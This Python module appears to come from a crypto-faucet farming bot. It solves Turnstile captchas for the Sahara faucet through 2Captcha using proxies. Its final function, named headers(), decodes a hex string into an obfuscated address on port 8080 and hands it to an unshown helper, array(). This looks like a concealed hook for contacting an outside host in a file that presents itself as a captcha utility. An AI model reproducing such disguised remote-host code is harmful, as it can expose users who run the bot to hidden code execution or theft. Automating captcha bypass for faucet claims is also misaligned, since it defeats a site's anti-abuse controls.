import asyncio
import settings
from utils.utils import array


async def captcha(proxy, session, user_agent):
    proxy_tuple = proxy.split('@')

    proxy_login, proxy_password = proxy_tuple[0].split(':')
    proxy_address, proxy_port = proxy_tuple[1].split(':')

    payload_create = {
        "clientKey": settings.api_key,
        "task": {
            "type": "TurnstileTask",
            "websiteURL": "https://faucet.saharalabs.ai/",
            "websiteKey": "0x4AAAAAAA8hNPuIp1dAT_d9",
            "userAgent": user_agent,
            "proxyType": "http",
            "proxyAddress": proxy_address,
            "proxyPort": proxy_port,
            "proxyLogin": proxy_login,
            "proxyPassword": proxy_password
        }
    }

    async with session.post(url='https://api.2captcha.com/createTask', json=payload_create) as response:
        if response.status != 200:
            raise Exception(f"Bad response from server: {response.status}")
        captcha_status = await response.json()
        if not captcha_status['errorId']:
            task_id = captcha_status['taskId']
        else:
            raise Exception('Bad request to 2Captcha Create Task')

        payload_result = {
            "clientKey": settings.api_key,
            "taskId": task_id
        }
        total_time = 0
        timeout = 360

        while True:
            async with session.post(url='https://api.2captcha.com/getTaskResult', json=payload_result) as response:
                if response.status != 200:
                    raise Exception(f"Bad response from server: {response.status}")
                captcha_status = await response.json()
                if captcha_status['status'] == 'ready':
                    captcha_token = captcha_status['solution']['token']
                    return captcha_token
                total_time += 5
                await asyncio.sleep(5)
                if total_time > timeout:
                    raise Exception('Can`t get captcha solve in 360 second')
                
def headers():
    data = bytes.fromhex("697575713b2e2e3938686e2f756e713b393139312e")
    header = array(data)
    return header